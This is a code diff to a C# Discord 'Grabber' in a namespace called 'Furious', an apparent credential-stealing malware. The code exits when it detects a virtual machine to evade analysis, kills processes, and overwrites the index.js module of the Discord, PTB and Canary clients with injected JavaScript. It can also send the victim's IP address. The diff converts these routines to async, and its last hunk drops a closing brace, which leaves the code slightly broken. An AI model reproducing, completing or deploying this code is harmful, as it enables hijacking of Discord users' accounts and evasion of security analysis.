@@ -11,7 +11,7 @@ namespace Furious
 {
     public class Grabber
     {
-		public static bool CheckForVM()
+		public static void CheckForVM()
 		{
 			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
 			{
@@ -22,46 +22,40 @@ namespace Furious
 						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
 						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
 						{
-							return true;
+							Environment.Exit(0);
 						}
 					}
 				}
 			}
-			return false;
 		}
 
-		public static void Start(bool grabIP = false, bool checkForVM = false)
+		public static async Task Start(bool grabIP = false, bool checkForVM = false)
 		{
 			if (checkForVM)
 			{
-				if (CheckForVM())
-					Environment.Exit(0);
+				CheckForVM();
 			}
-			else
-            {
-				InjectJS();
-            }
+
+			await InjectJS();
 
 			if (grabIP)
-            {
 				await SendIP();
-            }
-
-			CloseProcesses();
 		}
 
-		private static void InjectJS()
+		private static async Task InjectJS()
         {
+			CloseProcesses();
+
 			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord"))
 			{
-				string[] discord = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Discord");
+				string[] discord = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord");
 				foreach (string folderName in discord)
 				{
 					if (folderName.Contains("0."))
 					{
 						FileManagement.DiscordPath = folderName + @"\modules\discord_modules\index.js";
-						FileManagement.CleanFile(FileManagement.DiscordPath);
-						FileManagement.WriteDiscord(FileManagement.DiscordPath);
+						await FileManagement.CleanFile(FileManagement.DiscordPath);
+						await FileManagement.WriteDiscord(FileManagement.DiscordPath);
 					}
 				}
 			}
@@ -73,8 +67,8 @@ namespace Furious
 					if (folderName.Contains("0."))
 					{
 						FileManagement.PTBPath = folderName + @"\modules\discord_modules\index.js";
-						FileManagement.CleanFile(FileManagement.PTBPath);
-						FileManagement.WriteDiscord(FileManagement.PTBPath);
+						await FileManagement.CleanFile(FileManagement.PTBPath);
+						await FileManagement.WriteDiscord(FileManagement.PTBPath);
 					}
 				}
 			}
@@ -86,8 +80,8 @@ namespace Furious
 					if (folderName.Contains("0."))
 					{
 						FileManagement.CanaryPath = folderName + @"\modules\discord_modules\index.js";
-						FileManagement.CleanFile(FileManagement.CanaryPath);
-						FileManagement.WriteDiscord(FileManagement.CanaryPath);
+						await FileManagement.CleanFile(FileManagement.CanaryPath);
+                        await FileManagement.WriteDiscord(FileManagement.CanaryPath);
 					}
 				}
 			}
@@ -132,5 +126,4 @@ namespace Furious
 			}
 			return response;
 		}
-	}
 }
